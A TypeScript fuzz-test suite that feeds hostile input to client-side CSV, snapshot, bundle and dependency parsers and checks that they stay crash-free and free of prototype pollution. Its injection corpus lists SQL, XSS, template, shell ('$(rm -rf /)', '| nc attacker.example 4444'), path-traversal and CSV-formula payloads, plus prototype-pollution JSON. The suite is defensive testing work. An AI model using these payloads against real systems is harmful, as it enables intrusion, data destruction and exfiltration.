import { describe, it } from "vitest";
import assert from "node:assert/strict";
import { check, gen, mulberry32, type Rng } from "../test/proptest";

import {
  parseCsvText,
  parseFeatureGatingCsv,
  featureGatingRowsToCsv,
  type ScopeGatingRow,
  type ParseFeatureGatingCsvOptions,
} from "./feature-gating-csv";
import { parseSnapshotFile, validateSnapshot, buildTrend, portfolioCompletion, TREND_METRICS } from "./snapshots";
import { readBundleFile } from "./snapshot";
import { parseEdgeFile, validateEdge, materialOf, canonicalize } from "./dependencies";
import { crossProgrammeMap, refIds, itemDurationDays, type DepItem } from "./cross-programme-dependencies";

/**
 * CLIENT-SIDE PARSER FUZZ suite. Every function here ingests user-controlled text/objects (imported
 * files, CSV pasted by a PMO, session-storage blobs). The SAFETY invariant each rests on: hostile input
 * is treated as INERT DATA — it never crashes the parser, never executes, never pollutes a prototype,
 * and structurally-invalid payloads are rejected (dropped/null) rather than smuggled through as a
 * malformed record. Deterministic via the seeded `proptest` harness.
 */

// ── Injection corpus (mirrors api-server/src/__tests__/fuzz-injection.test.ts) ──
const INJECTION: readonly string[] = [
  "' OR '1'='1", "'; DROP TABLE users;--", "1 UNION SELECT password FROM users", "admin'--",
  "<script>alert(1)</script>", "javascript:alert(document.cookie)", "${process.env.SESSION_SECRET}",
  "{{constructor.constructor('return process')()}}", "`${7*7}`", "');alert(1);//", "eval('1+1')",
  "\"><img src=x onerror=alert(1)>", "{{7*7}}", "#{7*7}", "%{7*7}",
  "$(rm -rf /)", "; ls -la /", "&& cat /etc/passwd", "| nc attacker.example 4444", "`whoami`",
  "__proto__", "constructor", "prototype", "__proto__.polluted",
  "../../../etc/passwd", "..\\..\\..\\windows\\system32\\cmd.exe", "/ok\r\nSet-Cookie: x=1",
  "file:///etc/passwd", "‮", "{{ $env.SESSION_SECRET }}", "=cmd|'/c calc'!A1", "+1+1", "@SUM(1)", "\t=1",
];
const NASTY_ALPHABET = "ab12'\"`{}$();<>\\/-. \n\t=&|:@#%,";

/** A generated hostile string: a corpus payload, a random nasty string, or the two spliced. */
function evil(r: Rng): string {
  const roll = gen.int(r, 0, 2);
  const rand = gen.string(r, NASTY_ALPHABET, 48);
  if (roll === 0) return gen.pick(r, INJECTION);
  if (roll === 1) return rand;
  return gen.pick(r, INJECTION) + rand;
}

/** Prototype-pollution sentinels: nothing below should ever become defined. */
function assertNoPollution(): void {
  const probe = {} as Record<string, unknown>;
  assert.equal(probe["polluted"], undefined, "Object.prototype polluted (.polluted)");
  assert.equal(probe["x"], undefined, "Object.prototype polluted (.x)");
  assert.equal((Object.prototype as Record<string, unknown>)["polluted"], undefined);
  assert.equal(([] as unknown as Record<string, unknown>)["polluted"], undefined);
}

/** A JSON string carrying a prototype-pollution payload at some depth/ordering, sometimes malformed. */
function pollutingJson(r: Rng): string {
  const key = gen.pick(r, ["__proto__", "constructor", "prototype"]);
  const inner = `{"polluted":true,"x":${gen.int(r, 0, 9)}}`;
  const forms = [
    `{"${key}":${inner}}`,
    `{"a":1,"${key}":${inner},"b":2}`,
    `{"edges":[{"${key}":${inner}}]}`,
    `{"snapshots":[{"${key}":${inner},"capturedAt":"2024-01-01"}]}`,
    `[{"${key}":${inner}},{"y":2}]`,
    `{"nested":{"deep":{"${key}":${inner}}}}`,
  ];
  let s = gen.pick(r, forms);
  if (gen.bool(r)) s += gen.pick(r, ["", "}", " trailing", "   ", ",", evil(r)]); // sometimes malformed
  return s;
}

const RUNS = 250;

// ── feature-gating-csv.ts ────────────────────────────────────────────────────
describe("fuzz: feature-gating-csv", () => {
  it("parseCsvText: returns a string[][] and never throws on arbitrary hostile text", () => {
    check(
      (r) => gen.array(r, (rr) => gen.oneOf<string>(rr, evil, (r2) => `${evil(r2)},${evil(r2)}\n"${evil(r2)}"`), 6).join(gen.pick(r, ["\n", "\r\n", ","])),
      (text) => {
        let table!: string[][];
        assert.doesNotThrow(() => { table = parseCsvText(text); });
        assert.ok(Array.isArray(table));
        for (const row of table) { assert.ok(Array.isArray(row)); for (const cell of row) assert.equal(typeof cell, "string"); }
      },
      { runs: RUNS },
    );
  });

  it("parseFeatureGatingCsv: never throws, never emits a __proto__/constructor scopeId, no pollution", () => {
    const opts: ParseFeatureGatingCsvOptions = {
      validFeatureIds: new Set(["feat-a", "feat-b", "rep-x"]),
      knownProgrammeIds: new Set(["prog1"]),
      knownProjectIds: new Set(["proj1"]),
    };
    check(
      (r) => {
        const rows = gen.array(r, (rr) => {
          const type = gen.pick(rr, ["programme", "project", evil(rr), "programme"]);
          const id = gen.oneOf<string>(rr, evil, () => gen.pick(rr, ["prog1", "proj1", "__proto__", "constructor", ""]));
          const ids = () => gen.array(rr, (r2) => gen.pick(r2, ["feat-a", "feat-b", "rep-x", evil(r2)]), 3).join("|");
          return `${type},${id},${evil(rr)},${ids()},${ids()},${ids()}`;
        }, 6);
        const header = gen.bool(r) ? "scopeType,scopeId,scopeName,disabled,required,forbidden" : evil(r);
        return [header, ...rows].join("\r\n");
      },
      (text) => {
        let res!: ReturnType<typeof parseFeatureGatingCsv>;
        assert.doesNotThrow(() => { res = parseFeatureGatingCsv(text, opts); });
        for (const row of res.rows) {
          assert.ok(!["__proto__", "constructor", "prototype"].includes(row.scopeId), "proto-key scopeId leaked");
          assert.ok(row.scopeType === "programme" || row.scopeType === "project", "invalid scopeType accepted");
          for (const id of [...row.disabled, ...row.required, ...row.forbidden]) assert.ok(opts.validFeatureIds.has(id), "unknown catalogue id accepted");
        }
        assertNoPollution();
      },
      { runs: RUNS },
    );
  });

  it("featureGatingRowsToCsv: neutralises CSV-injection formula triggers in every serialised cell", () => {
    check(
      (r) => {
        const cell = () => gen.oneOf<string>(r, evil, (rr) => gen.pick(rr, ["=cmd", "+1", "-2", "@x", "\t=1", "\r=y", "safe"]));
        const rows: ScopeGatingRow[] = gen.array(r, () => ({
          scopeType: gen.pick(r, ["programme", "project"] as const),
          scopeId: cell(), scopeName: cell(),
          disabled: [cell()], required: [cell()], forbidden: [cell()],
        }), 5);
        return rows;
      },
      (rows) => {
        const csv = featureGatingRowsToCsv(rows);
        assert.equal(typeof csv, "string");
        // Round-trip through the real RFC-4180 parser (handles quoting/embedded commas), then assert no
        // data cell begins with a spreadsheet formula trigger — the leading "'" guard must have fired.
        const table = parseCsvText(csv);
        for (const row of table.slice(1)) {
          for (const cell of row) {
            assert.ok(!/^[=+\-@\t\r]/.test(cell), `un-neutralised formula trigger serialised: ${JSON.stringify(cell)}`);
          }
        }
      },
      { runs: RUNS },
    );
  });
});

// ── snapshots.ts ─────────────────────────────────────────────────────────────
describe("fuzz: snapshots (portfolio trends)", () => {
  it("parseSnapshotFile: never throws, returns an array, no prototype pollution", () => {
    check(
      (r) => gen.oneOf<string>(r, evil, pollutingJson, (rr) => JSON.stringify({ snapshots: [{ capturedAt: "2024-01-01", projects: [{ id: evil(rr), name: evil(rr), issueCount: gen.int(rr, -5, 50) }], portfolio: [] }] })),
      (text) => {
        let out!: ReturnType<typeof parseSnapshotFile>;
        assert.doesNotThrow(() => { out = parseSnapshotFile(text); });
        assert.ok(Array.isArray(out));
        for (const s of out) { assert.equal(typeof s.capturedAt, "string"); assert.ok(Array.isArray(s.projects) && Array.isArray(s.portfolio)); }
        assertNoPollution();
      },
      { runs: RUNS },
    );
  });

  it("validateSnapshot: returns null or a structurally-coerced snapshot (finite numbers) for arbitrary objects", () => {
    check(
      (r) => ({
        capturedAt: gen.oneOf<unknown>(r, () => "2024-01-01T00:00:00Z", (rr) => evil(rr), () => 123, () => null),
        projects: gen.oneOf<unknown>(r, () => [{ id: evil(r), name: evil(r), issueCount: "5", completedCount: evil(r) }], () => "nope", () => [null, 1, evil(r)]),
        portfolio: gen.oneOf<unknown>(r, () => [{ projectId: evil(r), ragStatus: evil(r), scheduleVarianceDays: evil(r) }], () => 42),
        [gen.pick(r, ["__proto__", "constructor", "x"])]: { polluted: true },
      }),
      (obj) => {
        let snap!: ReturnType<typeof validateSnapshot>;
        assert.doesNotThrow(() => { snap = validateSnapshot(obj); });
        if (snap !== null) {
          for (const p of snap.projects) { assert.ok(Number.isFinite(p.issueCount) || Number.isNaN(p.issueCount)); assert.equal(typeof p.id, "string"); }
          assert.equal(typeof snap.capturedAt, "string");
        }
        assertNoPollution();
      },
      { runs: RUNS },
    );
  });

  it("buildTrend/portfolioCompletion: finite metric values for coerced snapshots", () => {
    check(
      (r) => {
        const snapObjs = gen.array(r, (rr) => ({
          capturedAt: `2024-01-${String(gen.int(rr, 10, 28))}`,
          projects: gen.array(rr, (r2) => ({ id: evil(r2), name: "n", issueCount: gen.int(r2, 0, 100), completedCount: gen.int(r2, 0, 100) }), 4),
          portfolio: gen.array(rr, (r2) => ({ projectId: evil(r2), ragStatus: gen.pick(r2, ["RED", "GREEN", evil(r2)]), scheduleVarianceDays: gen.int(r2, -50, 50), budgetVariancePercentage: gen.int(r2, -50, 50), activeBlockersCount: gen.int(r2, 0, 9) }), 4),
        }), 5);
        return snapObjs.map(validateSnapshot).filter((s): s is NonNullable<typeof s> => s !== null);
      },
      (snaps) => {
        for (const s of snaps) assert.ok(Number.isFinite(portfolioCompletion(s)), "completion NaN");
        for (const m of TREND_METRICS) {
          const trend = buildTrend(snaps, m.key);
          for (const pt of trend) { assert.ok(Number.isFinite(pt.value), `trend ${m.key} NaN`); assert.equal(typeof pt.date, "string"); }
        }
      },
      { runs: RUNS },
    );
  });
});

// ── snapshot.ts (signed-bundle file reader) ──────────────────────────────────
describe("fuzz: snapshot.readBundleFile", () => {
  it("resolves to a bundle or rejects with a friendly Error — never an uncontrolled crash", async () => {
    const rng = mulberry32(0x51ce);
    for (let i = 0; i < RUNS; i++) {
      const text = gen.oneOf<string>(rng, evil, pollutingJson,
        (r) => JSON.stringify({ manifest: { contentHash: evil(r), scope: evil(r), createdAt: "2024-01-01" }, data: evil(r) }),
        (r) => JSON.stringify({ manifest: { scope: evil(r) } }));
      const file = new File([text], "bundle.json", { type: "application/json" });
      try {
        const bundle = await readBundleFile(file);
        // Accepted ⇒ it structurally is a bundle.
        assert.ok(bundle && typeof bundle === "object" && "manifest" in bundle && "data" in bundle, "accepted a non-bundle");
      } catch (e) {
        assert.ok(e instanceof Error, `non-Error thrown: ${String(e)}`);
      }
      assertNoPollution();
    }
  });
});

// ── dependencies.ts ──────────────────────────────────────────────────────────
describe("fuzz: dependencies (edge links)", () => {
  it("parseEdgeFile: never throws, returns valid inert edges only, no pollution", () => {
    check(
      (r) => gen.oneOf<string>(r, evil, pollutingJson,
        (rr) => JSON.stringify({ edges: gen.array(rr, (r2) => ({
          edgeKey: evil(r2), type: gen.pick(r2, ["blocks", "depends_on", "relates_to", evil(r2)]),
          from: { system: evil(r2), projectRef: evil(r2), itemRef: evil(r2) },
          to: { system: evil(r2), projectRef: evil(r2), itemRef: evil(r2) },
          fromHash: evil(r2), toHash: evil(r2), note: evil(r2),
        }), 5) })),
      (text) => {
        let out!: ReturnType<typeof parseEdgeFile>;
        assert.doesNotThrow(() => { out = parseEdgeFile(text); });
        assert.ok(Array.isArray(out));
        for (const e of out) {
          assert.ok(["blocks", "depends_on", "relates_to"].includes(e.type), "invalid edge type leaked");
          assert.ok(typeof e.edgeKey === "string" && e.edgeKey.length > 0);
          for (const ref of [e.from, e.to]) assert.ok(typeof ref.system === "string" && typeof ref.projectRef === "string" && typeof ref.itemRef === "string");
        }
        assertNoPollution();
      },
      { runs: RUNS },
    );
  });

  it("validateEdge: null or a well-typed edge for arbitrary objects", () => {
    check(
      (r) => ({
        edgeKey: gen.oneOf<unknown>(r, evil, () => "", () => 123, () => null),
        type: gen.pick(r, ["blocks", "depends_on", "relates_to", evil(r), ""]),
        from: gen.oneOf<unknown>(r, () => ({ system: evil(r), projectRef: evil(r), itemRef: evil(r) }), () => ({ system: 1 }), evil),
        to: { system: evil(r), projectRef: evil(r), itemRef: evil(r) },
        fromHash: gen.oneOf<unknown>(r, evil, () => 5),
        toHash: evil(r),
        [gen.pick(r, ["__proto__", "constructor", "z"])]: { polluted: true },
      }),
      (obj) => {
        const e = validateEdge(obj);
        if (e !== null) assert.ok(["blocks", "depends_on", "relates_to"].includes(e.type));
        assertNoPollution();
      },
      { runs: RUNS },
    );
  });

  it("materialOf: keeps ONLY the material fields, drops injected/extra keys, no pollution", () => {
    const MATERIAL = new Set(["status", "title", "assignee", "dueDate", "version"]);
    check(
      (r) => {
        const o: Record<string, unknown> = {};
        for (const k of ["status", "title", "assignee", "dueDate", "version"]) if (gen.bool(r)) o[k] = evil(r);
        o[evil(r)] = evil(r); // hostile extra key
        o[gen.pick(r, ["__proto__", "constructor", "polluted", "x"])] = { polluted: true };
        return o;
      },
      (item) => {
        const out = materialOf(item);
        for (const k of Object.keys(out)) assert.ok(MATERIAL.has(k), `non-material key survived: ${k}`);
        assertNoPollution();
      },
      { runs: RUNS },
    );
  });

  it("canonicalize: deterministic string, never throws on arbitrary nested/injection structures", () => {
    const build = (r: Rng, depth: number): unknown => {
      if (depth <= 0) return gen.oneOf<unknown>(r, evil, () => gen.int(r, -1e6, 1e6), () => null, () => gen.bool(r));
      return gen.oneOf<unknown>(r,
        evil,
        () => gen.array(r, (rr) => build(rr, depth - 1), 3),
        () => { const o: Record<string, unknown> = {}; for (let i = 0; i < gen.int(r, 0, 3); i++) o[evil(r)] = build(r, depth - 1); return o; });
    };
    check(
      (r) => build(r, 3),
      (value) => {
        let a!: string, b!: string;
        assert.doesNotThrow(() => { a = canonicalize(value); b = canonicalize(value); });
        assert.equal(typeof a, "string");
        assert.equal(a, b, "canonicalize not deterministic");
        assertNoPollution();
      },
      { runs: RUNS },
    );
  });
});

// ── cross-programme-dependencies.ts (graph derivation over dirty rows) ───────────
describe("fuzz: cross-programme-dependencies", () => {
  it("refIds: always a string[] of trimmed non-empty ids for any ref shape", () => {
    check(
      (r) => gen.oneOf<unknown>(r, evil, () => null, () => undefined, () => gen.array(r, (rr) => gen.oneOf<unknown>(rr, evil, () => 5, () => null), 4), () => "   "),
      (ref) => {
        const out = refIds(ref as never);
        assert.ok(Array.isArray(out));
        for (const id of out) { assert.equal(typeof id, "string"); assert.ok(id.length > 0 && id === id.trim(), "untrimmed/empty id"); }
      },
      { runs: RUNS },
    );
  });

  it("itemDurationDays: finite integer >= 1 even for garbage/reversed dates", () => {
    check(
      (r) => ({ startDate: gen.oneOf<string | null>(r, () => "2024-01-01", () => "garbage", () => "", () => null, (rr) => new Date(gen.int(rr, 0, 2e12)).toISOString()), dueDate: gen.oneOf<string | null>(r, () => "2024-02-01", () => "nope", () => null, (rr) => new Date(gen.int(rr, 0, 2e12)).toISOString()) }),
      (item) => {
        const d = itemDurationDays(item);
        assert.ok(Number.isFinite(d) && Number.isInteger(d) && d >= 1, `bad duration ${d}`);
      },
      { runs: RUNS },
    );
  });

  it("crossProgrammeMap: never throws, all node schedule numbers finite, edges inert, no pollution", () => {
    const itemGen = (ids: string[]) => (r: Rng): DepItem => ({
      id: gen.pick(r, ids),
      title: gen.bool(r) ? evil(r) : null,
      programmeId: gen.bool(r) ? gen.pick(r, ["prog1", "prog2", evil(r), "__proto__"]) : null,
      programmeName: gen.bool(r) ? evil(r) : null,
      startDate: gen.oneOf<string | null>(r, () => "2024-01-01", () => "garbage", () => null),
      dueDate: gen.oneOf<string | null>(r, () => "2024-03-01", () => "nope", () => null),
      dependsOn: gen.oneOf(r, () => gen.pick(r, ids), () => gen.array(r, () => gen.pick(r, ids), 3), () => evil(r), () => null),
      parentTask: gen.bool(r) ? gen.pick(r, ids) : null,
    });
    check(
      (r) => {
        const ids = gen.array(r, (rr) => gen.pick(rr, ["a", "b", "c", "d", "__proto__", evil(rr)]), 6);
        const pool = ids.length ? ids : ["a"];
        return gen.array(r, itemGen(pool), 8);
      },
      (items) => {
        let map!: ReturnType<typeof crossProgrammeMap>;
        assert.doesNotThrow(() => { map = crossProgrammeMap(items); });
        for (const n of map.nodes) {
          for (const v of [n.duration, n.es, n.ef, n.ls, n.lf, n.float]) assert.ok(Number.isFinite(v), `node schedule NaN (${n.id})`);
          assert.equal(typeof n.title, "string");
        }
        for (const e of map.edges) {
          assert.equal(typeof e.crossProgramme, "boolean");
          assert.equal(typeof e.from, "string");
          assert.equal(typeof e.to, "string");
        }
        assert.ok(Number.isFinite(map.projectDuration));
        assert.equal(typeof map.hasCycle, "boolean");
        assertNoPollution();
      },
      { runs: RUNS },
    );
  });
});
